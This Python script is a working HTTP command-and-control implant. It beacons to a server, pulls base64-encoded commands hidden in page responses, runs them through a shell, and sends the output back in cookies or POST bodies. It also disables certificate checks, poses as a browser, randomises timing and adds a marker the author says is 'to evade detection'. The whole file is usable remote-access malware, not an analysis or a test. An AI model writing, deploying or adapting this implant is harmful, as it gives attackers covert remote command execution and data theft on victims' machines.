#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Code by Green-m
# Tested with python2.7 and python3.8
#
#
import base64
import os
import sys
import uuid
import time
import subprocess
import random

global url
global headers

#
# URL and http headers
#
url = "https://127.0.0.1:44443"
url += "/search/"
headers = [
    ('User-Agent', 'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'),
    ('Accept-Encoding', 'gzip, deflate, br')
]


PY3 = sys.version_info[0] >= 3

def base64ify(bytes_or_str):
    if PY3 and isinstance(bytes_or_str, str):
        input_bytes = bytes_or_str.encode('utf8')
    else:
        input_bytes = bytes_or_str

    output_bytes = base64.urlsafe_b64encode(input_bytes)
    if PY3:
        return output_bytes.decode('utf-8')
    else:
        return output_bytes


def debase64ify(bytes_or_str):
    if PY3 and isinstance(bytes_or_str, str) or isinstance(bytes_or_str, unicode):
        input_bytes = bytes_or_str.encode('utf8')
    else:
        input_bytes = bytes_or_str

    #print(input_bytes,type(input_bytes))
    output_bytes = base64.urlsafe_b64decode(input_bytes)
    if PY3:
        return output_bytes.decode('utf-8')
    else:
        return output_bytes

#
# Import urllib and ssl for all versions of python,
# this code from msf.
#
version = sys.version_info
ul = __import__({2: 'urllib2', 3: 'urllib.request'}[
                version[0]], fromlist=['build_opener'])
hs = []
if (version[0] == 2 and version >= (2, 7, 9)) or version >= (3, 4, 3):
    import ssl
    sc = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    sc.check_hostname = False
    sc.verify_mode = ssl.CERT_NONE
    hs.append(ul.HTTPSHandler(0, sc))

# Say hello to servers
def say_hello():
    opener = ul.build_opener(*hs)
    opener.addheaders = headers
    opener.addheaders = [('Cookie', 'SEVMTE8=')]  # base64 "HELLO"
    random_url = uuid.uuid4().hex
    
    for i in range(10):
        try:
            response = opener.open(url + random_url).read()
            break
        except Exception as e:
            print("connect error,try again")
            time.sleep(1)
            continue

    if type(response) == bytes:
        response = response.decode('utf-8')
    opener.close()

    #if "SEVMTE8=" in response:
    if "SEVMTE8=" in response:
        return True
    else:
        return False

# ask command from server
def fetch_cmd():
    opener = ul.build_opener(*hs)
    opener.addheaders = headers
    opener.addheaders = [('Cookie', 'QVNL')]  # base64 "ASK"
    random_url = uuid.uuid4().hex
    #response = opener.open(url + random_url).read()
    for i in range(10):
        try:
            response = opener.open(url + random_url).read()
            break
        except Exception as  e:
            print("connect error,try again")
            time.sleep(1)
            continue

    if type(response) == bytes:
        response = response.decode('utf-8')
    index = response.rfind('>') + 1
    opener.close()
    return debase64ify(response[index:])

# run command locally
def run_cmd(cmd):
    p = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p.communicate()
    if len(stderr) > 0:
        return stderr.decode("utf-8")
    return stdout.decode("utf-8")

#
# If length of result of execution bigger than 4000,
# post it in body, not in the cookie.
#
def reply_server_with_body(output):
    reply_str = base64ify(output.encode("utf-8"))
    opener = ul.build_opener(*hs)
    opener.addheaders = headers
    opener.addheaders = [('Cookie', 'VDBMME5H')]  # T0L0NG base64
    random_url = uuid.uuid4().hex
    #opener.open(url + random_url).read()
    for i in range(10):
        try:
            opener.open(url + random_url, ('G0H3LL' + reply_str).encode('utf-8')).read() # Add G0H3LL to evade detection.
            break
        except Exception as  e:
            print("connect error,try again")
            print(str(e))
            time.sleep(1)
            continue
    opener.close()


#
# cookie max length is 4096
#
def reply_server(output):
    reply_str = base64ify(output.encode("utf-8"))

    if len(reply_str) > 4000:
        reply_server_with_body(output)
        return

    opener = ul.build_opener(*hs)
    opener.addheaders = headers
    opener.addheaders = [('Cookie', reply_str)]  # base64 output
    random_url = uuid.uuid4().hex
    #opener.open(url + random_url).read()
    for i in range(10):
        try:
            opener.open(url + random_url).read()
            break
        except Exception as  e:
            print("connect error,try again")
            time.sleep(1)
            continue
    opener.close()


# keep running 
success = False
for i in range(3):
    success = say_hello()
    if success == True:
        break
    time.sleep(random.randint(1, 5))

if success != True:
    exit()

while True:
    time.sleep(random.randint(1, 3))
    cmd = fetch_cmd()
    if cmd == '':
        time.sleep(random.randint(1, 3))
        continue
    if cmd == 'exit':
        reply_server('EXIT OK')
        exit()

    output = run_cmd(cmd)
    reply_server(output)
    cmd = ''
